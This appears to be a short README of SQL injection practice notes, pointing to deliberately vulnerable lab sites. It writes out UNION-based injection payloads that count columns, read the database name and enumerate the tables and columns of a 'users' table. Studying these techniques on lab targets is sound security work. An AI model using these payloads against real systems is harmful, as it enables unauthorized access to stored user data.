# Vaccine

# Usage

```
export TOKEN=YOUR_COOKIE
```

# Websites

- https://altoromutual.com/login.jsp

- https://redtiger.labs.overthewire.org/

## UNION

### MySQL
- https://portswigger.net/web-security/sql-injection/union-attacks

- Use `ORDER BY` to check numbers of colums
```
' ORDER BY 1--
' ORDER BY 2--
...
```
- Get database name
```
' UNION SELECT DATABASE(), DATABASE()
```
- Get table_names
```
' UNION SELECT table_name, table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa' #
```
- Get column_names
```
' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name = 'users'#
```
